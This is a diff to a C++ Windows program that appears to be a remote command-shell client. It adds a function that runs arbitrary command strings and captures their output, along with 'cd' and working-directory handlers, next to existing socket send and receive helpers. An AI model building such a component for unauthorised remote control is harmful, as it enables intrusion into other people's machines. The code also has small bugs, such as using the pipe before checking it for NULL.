@@ -5,7 +5,7 @@
 #include <stdio.h>
 #include <string>
 #include <windows.h>
-
+#include <direct.h> //_chdir
 
 string recvUltraSafe(int sock)
 {   
@@ -107,7 +107,6 @@ void sendUltraSafe(int sock, string data)
         timeout.tv_sec = TIMEOUT_SOCK;
         timeout.tv_usec = 0;
 
-
         int selectSock = select(0, &fds, 0, 0, &timeout);
         if(selectSock > 0)
         {
@@ -126,7 +125,6 @@ void sendUltraSafe(int sock, string data)
             {
                 cout << "ERROR in sendUltraSafe confirmation: "  << endl;
             }
-
         }
         else if (selectSock == 0)
         {
@@ -137,14 +135,56 @@ void sendUltraSafe(int sock, string data)
     
 }
 
-string generateToken(int length)
+string exec(string command)
 {
-    string token;
-    char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
+    command += " 2>&1"; //for catch stderr
+    
+    char buffer[1024];
+    string result;
 
-    for(int i=0; i < length; i++)
-    {
-        token += hex_characters[rand()%16]; //use (rand() % 16) to generate a random number between 0 to 15 
+    FILE* pipe = _popen(command.c_str(), "rt");
+    int fd_fp = _fileno(pipe);
+    cout << "fd_f: " << fd_fp << endl;
+
+    if (!pipe) 
+    { 
+        ///popen fail;
+        cout << "POPEN FAILED" << endl;
+        return ""; //Faiul
+        //return "popen failed!";
     }
-    return token;
+    // read till end of process:
+    
+    while (!feof(pipe)) 
+    {   memset(buffer,0,sizeof(buffer));
+        // use buffer to read and add to result
+        if (fgets(buffer, sizeof(buffer), pipe) != NULL)
+        {
+            result.append(buffer,strlen(buffer));
+        }
+    }
+    _pclose(pipe);
+    
+    return result;
+    //cout << "Mod shell finish " << endl;
+}
+
+int changeDirectory(string path)
+{
+//    cout << path.substr(3,path.length()) << endl;
+    if(_chdir((path.substr(3,path.length())).c_str())!=0)
+    {
+        return 1;
+    }
+    return 0;
+}
+
+string getPath()
+{
+    char* buffer;
+   // Get the current working directory:
+    if ( (buffer = _getcwd( NULL, 0 )) == NULL )
+        ;
+    string path = buffer;
+    return path;
 }
